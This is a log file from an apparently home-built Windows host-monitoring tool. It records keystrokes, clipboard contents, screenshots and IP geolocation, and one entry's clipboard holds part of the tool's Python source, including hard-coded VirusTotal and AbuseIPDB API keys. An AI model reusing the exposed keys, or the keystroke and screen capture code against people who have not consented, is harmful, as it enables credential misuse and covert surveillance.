{"timestamp": "2025-06-14T08:58:27.473640+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "5e6ab49956b7bbdb42906d04dd77b5a0b52cb29888fade5367f0fb58971a1de1", "_raw_log_hash": "4a429f732c55fee252ff8fc6e5e6ae46e96c6a68fc450935d107cbebfa7a7645"}
{"timestamp": "2025-06-14T08:58:41.053013+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137750>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "e71473e5e2e4486b4e08c369d0ac83632580672b0eaf3d79c77f62f44aebe2c6", "_raw_log_hash": "feeb8653a45af66998b069b19909dcc6f6bddebbc8c7de8130add52212e702e7"}
{"timestamp": "2025-06-14T08:58:54.599293+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137390>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "7255581f81c014a596f8e0a54e9456ad1ada56d8d4b21542715664d4ab0dfde1", "_raw_log_hash": "0247036b7c09c3f55367f8e88ec47a92ddcf91aeff9e5215b44db66eed008c78"}
{"timestamp": "2025-06-14T08:59:08.237252+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137ED0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9e9627d09ae4809f2f0c98656b7821331bb95722246279e084b5abf77067c27d", "_raw_log_hash": "2a278fdd00e445e673fa559c020bb7a717c583888a33272ce56e889883418c9d"}
{"timestamp": "2025-06-14T08:59:21.929649+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137B10>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "02498e01b518f9c73458d5350fc9aa6dddad668345af9ebd449b2d4d7db4efc9", "_raw_log_hash": "2b9510ee02a19fac1083565addd415bfe1dcf976b9cade5f1a513b140c23e92f"}
{"timestamp": "2025-06-14T08:59:35.699834+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D1374D0>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "595f2d924f9c2659286a50c223482b1f5b3c11b57ed166a1686ef88a438855d7", "_raw_log_hash": "20367213f26678bf2be69ab0a730bb13e98186c8d1834646850db70a299cb987"}
{"timestamp": "2025-06-14T08:59:49.402820+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137610>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "d7631e73e0901bc59a9cad908650c9691e3696ad62332545ea5789449db28018", "_raw_log_hash": "ed3e0f3f90fecb865b8b52afb6af26c21d4360fd9ecba26443f88e529fb82b37"}
{"timestamp": "2025-06-14T09:00:02.975020+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "127.0.0.1", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["IP info lookup failed: HTTPSConnectionPool(host='ipinfo.io', port=443): Max retries exceeded with url: /json (Caused by NameResolutionError(\"<urllib3.connection.HTTPSConnection object at 0x000001410D137890>: Failed to resolve 'ipinfo.io' ([Errno 11001] getaddrinfo failed)\"))"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "9e6b78578544391023de03f0141a516cf13ee8916a50f6cfbc1ba59866496482", "_raw_log_hash": "59ff26079b364c70bc96aa2456049b0867eeb5a5545b7fed998653d2d1ae19be"}
{"timestamp": "2025-06-14T10:40:11.382207+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.3", "public_ip": "46.50.2.242", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "23a8f6210b5134bcffb7fa2db7f7d1013af8aeacf5b9af7a0c12b0acc49fc467", "_raw_log_hash": "603ddbbc54b8e87ed9931c4d4f98afef7c01d6d6363de1095d07b72ac4b1ae51"}
{"timestamp": "2025-06-14T10:40:28.863232+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.3", "public_ip": "46.50.2.242", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "stop[shift_r]_snakey\u00ba[BACKSPACE][ENTER]", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (806 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "24eaedd9ce648876e1140f030785eb135c1afd0d5ccce9b46bc612864cf674ae", "_raw_log_hash": "76ec5c75241d1791f3a7be70e0c5f31203e7b05488ffc16d71fac2527fbb8b14"}
{"timestamp": "2025-06-20T08:36:32.960518+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.63.129", "public_ip": "83.223.235.82", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (807 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "fc8669c482c181d16f3088a2f1fa50eefff1f828dc003b63f512e784b1318af3", "_raw_log_hash": "a1397b32d60a9d42321064bf0d894d9f0364d5da4a021793878594b91042e212"}
{"timestamp": "2025-06-20T08:36:49.232672+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.63.129", "public_ip": "83.223.235.82", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (807 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "cf14cf3345749d9f7e477dca5403e3b0df91451ffa26924c134095d2963a6d15", "_raw_log_hash": "b8356aeb12e2793548d4057dd2e422bc7446522064385283fe5f99103d03fc57"}
{"timestamp": "2025-06-20T08:37:03.813258+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.63.129", "public_ip": "83.223.235.82", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (807 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "a397e23a9aa0b3943e016f0d1432647fe11566856f784e286f61ebf6e1f99ca0", "_raw_log_hash": "f93e43de20b0e5e878e6cf563dc59ec14222fbf554e4603ded58178f928c5a44"}
{"timestamp": "2025-06-20T08:37:18.243760+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.63.129", "public_ip": "83.223.235.82", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (807 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "e5b142f666afa697e4ab41b958d609715d59305d14fdd748405a95175e1e713b", "_raw_log_hash": "a0788fc61320fdedd8dd430680800119321ec1ce1b398e947922cf86484b7deb"}
{"timestamp": "2025-06-20T08:37:32.235761+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.63.129", "public_ip": "83.223.235.82", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (807 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "1cdef6b0d0a4ebfd3620ec6f94a0275f3c3863bc2ae14436b75496fcac76dd03", "_raw_log_hash": "1525754036e5b5abf034bc557b33f0335f4c1465b8db3bd1b73b308b489cad18"}
{"timestamp": "2025-06-20T08:37:46.408061+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.63.129", "public_ip": "83.223.235.82", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty or contains non-text data.", "keystrokes": "stop", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (807 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "6ee3d03f1e429f803e74e7fcaad1caf75eb4a54ea6814cc16d3406f5c5c250a6", "screenshot_hash": "454b9e790a4fdac329ead1451fba730413b0239bfdbb9c809a23c1f21ac2781a", "_raw_log_hash": "657c412ee566b53ac87fbdf858b9e3dfe8b4731c50e0a711dccf4a826896c4f2"}
{"timestamp": "2025-06-20T23:20:47.004861+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "188.82.234.217", "country": "PT", "region": "Castelo Branco", "city": "Covilh\u00e3", "isp": "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nimport yara\r\nfrom datetime import datetime\r\nfrom requests import get, post # Keep requests here\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests # Ensure requests is imported early\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\" # Your VirusTotal API Key\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === AbuseIPDB Config ===\r\nABUSE_API_KEY = \"186c285f36f339778ed4ce322cd971b512fb79144c5d4f333c5f4fd0398fa51c5b6db9994eb51e40\" # Your AbuseIPDB API Key\r\n\r\n# YARA Configuration\r\nyara_rules_path = os.path.join(\"C:/Users/ktmdu/PycharmProjects/Snakey/Yara-rules/yara_rules\", \"malware_index.yar\")\r\n\r\n# --- MODIFICATION START ---\r\n# Define the essential directories to scan for malware.\r\n# These are common locations where malware often resides or drops files.\r\n# Avoid scanning entire system drives (like C:/Windows, C:/Program Files)\r\n# as they contain millions of legitimate files that can trigger generic rules.\r\n\r\n# Get common user-specific paths\r\nuser_home = os.path.expanduser(\"~\")\r\nappdata_local = os.environ.get(\"LOCALAPPDATA\")\r\nappdata_roaming = os.environ.get(\"APPDATA\")\r\ntemp_dir = os.environ.get(\"TEMP\") or os.environ.get(\"TMP\") # Gets the primary temp dir\r\n\r\n# List of essential directories to scan.\r\n# We'll use os.path.normpath to ensure consistent path separators.\r\nyara_scan_dirs = [\r\n    os.path.normpath(os.path.join(user_home, \"Desktop\")),\r\n    os.path.normpath(os.path.join(user_home, \"Downloads\")),\r\n    os.path.normpath(os.path.join(user_home, \"Documents\")),\r\n    os.path.normpath(os.path.join(user_home, \"Pictures\")), # Sometimes malware drops here\r\n]\r\n\r\n# Add AppData and Temp directories if they exist\r\nif appdata_local:\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_local, \"Temp\"))) # Local AppData Temp\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_local))) # General Local AppData\r\nif appdata_roaming:\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_roaming))) # General AppData Roaming\r\nif temp_dir:\r\n    yara_scan_dirs.append(os.path.normpath(temp_dir)) # Main system temp dir\r\n\r\n# Add common persistence locations (Windows specific)\r\n# Use os.getenv for environment variables like PROGRAMDATA\r\nprogram_data = os.getenv('PROGRAMDATA') # C:\\ProgramData\r\nif program_data:\r\n    yara_scan_dirs.append(os.path.normpath(program_data))\r\n    # Common Startup folders (malware often uses these for persistence)\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(appdata_roaming, \"Microsoft\", \"Windows\", \"Start Menu\", \"Programs\", \"Startup\")))\r\n    yara_scan_dirs.append(os.path.normpath(os.path.join(program_data, \"Microsoft\", \"Windows\", \"Start Menu\", \"Programs\", \"Startup\")))\r\n\r\n# Filter out any non-existent directories from the list to avoid errors\r\nyara_scan_dirs = [d for d in yara_scan_dirs if os.path.isdir(d)]\r\n\r\nprint(f\"[INFO] YARA will scan the following directories: {yara_scan_dirs}\")\r\n# --- MODIFICATION END ---\r\n\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_ip_reputation_abuseipdb(ip):\r\n    url = \"https://api.abuseipdb.com/api/v2/check\"\r\n    headers = {\r\n        \"Accept\": \"application/json\",\r\n        \"Key\": ABUSE_API_KEY\r\n    }\r\n    params = {\r\n        \"ipAddress\": ip,\r\n        \"maxAgeInDays\": \"90\"\r\n    }\r\n    try:\r\n        response = requests.get(url, headers=headers, params=params)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return {\r\n                \"abuse_score\": data[\"data\"][\"abuseConfidenceScore\"],\r\n                \"total_reports\": data[\"data\"][\"totalReports\"],\r\n                \"country\": data[\"data\"][\"countryCode\"],\r\n                \"isp\": data[\"data\"][\"isp\"],\r\n                \"domain\": data[\"data\"][\"domain\"],\r\n                \"last_reported\": data[\"data\"][\"lastReportedAt\"]\r\n            }\r\n    except Exception as e:\r\n        print(f\"[ERROR] AbuseIPDB lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData_Roaming\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"AppData_Local\": os.environ.get(\"LOCALAPPDATA\", \"\"),\r\n        \"Temp\": os.environ.get(\"TEMP\", \"\")\r\n    }\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                # Get the number of files and folders directly inside this directory\r\n                item_count = 0\r\n                for item in os.listdir(path):\r\n                    if os.path.isfile(os.path.join(path, item)) or os.path.isdir(os.path.join(path, item)):\r\n                        item_count += 1\r\n                dir_status[name] = f\"Found ({item_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\ndef scan_with_yara():\r\n    findings = []\r\n    try:\r\n        if not os.path.exists(yara_rules_path):\r\n            print(f\"[ERROR] YARA rules file not found at: {yara_rules_path}\")\r\n            return findings\r\n\r\n        rules = yara.compile(filepath=yara_rules_path)\r\n        print(f\"[INFO] Starting YARA scan of {len(yara_scan_dirs)} essential directories.\")\r\n\r\n        # Define a list of file extensions that YARA can typically scan\r\n        # This includes executables, libraries, script files, and common archive/text formats.\r\n        # Add or remove extensions based on what types of malware you want to detect.\r\n        SCAN_EXTENSIONS = (\r\n            '.exe', '.dll', '.sys', '.ps1', '.vbs', '.js', '.bat', '.cmd', '.scr', '.hta',\r\n            '.jar', '.py', '.pyc', '.bin', '.dat', # Common binary/data files\r\n            '.zip', '.rar', '.7z', '.iso', # Archives (YARA can sometimes scan inside them, or the archive itself)\r\n            '.txt', '.log', '.ini', '.conf', '.json', '.xml', # Text-based config/log files\r\n            # DO NOT include document types like .docx, .pdf, .xlsx, .jpg, .png, .mp3, .mp4\r\n        )\r\n\r\n        for scan_dir in yara_scan_dirs:\r\n            if not os.path.isdir(scan_dir):\r\n                print(f\"[WARNING] YARA scan directory '{scan_dir}' does not exist, skipping.\")\r\n                continue\r\n\r\n            for root, dirs, files in os.walk(scan_dir):\r\n                for file in files:\r\n                    file_path = os.path.join(root, file)\r\n\r\n                    # --- ADD THIS EXTENSION CHECK ---\r\n                    if not file_path.lower().endswith(SCAN_EXTENSIONS):\r\n                        # print(f\"[DEBUG] Skipping non-scanable file type: {file_path}\") # Uncomment for debugging\r\n                        continue\r\n                    # --- END EXTENSION CHECK ---\r\n\r\n                    try:\r\n                        # Add a basic file size check to avoid scanning extremely large files\r\n                        # (e.g., limit to 50MB for most malware samples)\r\n                        if os.path.getsize(file_path) > 50 * 1024 * 1024: # 50 MB\r\n                            # print(f\"[DEBUG] Skipping large file: {file_path}\") # Uncomment for debugging\r\n                            continue\r\n\r\n                        matches = rules.match(filepath=file_path)\r\n                        if matches:\r\n                            findings.append({\"file\": file_path, \"matches\": [str(m) for m in matches]})\r\n                    except yara.Error as ye:\r\n                        if \"too many matches\" in str(ye).lower():\r\n                            print(f\"[WARNING] YARA: Too many matches for a string in rule(s) for file: {file_path}. Rule(s) might be too broad. Error: {ye}\")\r\n                        else:\r\n                            print(f\"[ERROR] YARA scanning error for {file_path}: {ye}\")\r\n                        continue\r\n                    except Exception as e:\r\n                        # Catch other file-related errors (e.g., permission denied, file in use)\r\n                        print(f\"[WARNING] Could not scan file {file_path} due to OS error: {e}\")\r\n                        continue\r\n    except Exception as e:\r\n        findings.append({\"error\": f\"YARA scan initialization failed: {e}\"})\r\n    return findings\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"abuseipdb\": {},\r\n        \"important_dirs\": {},\r\n        \"yara_findings\": []\r\n    }\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n\r\n        addr_info = socket.getaddrinfo(hostname, None)\r\n        ipv4s = 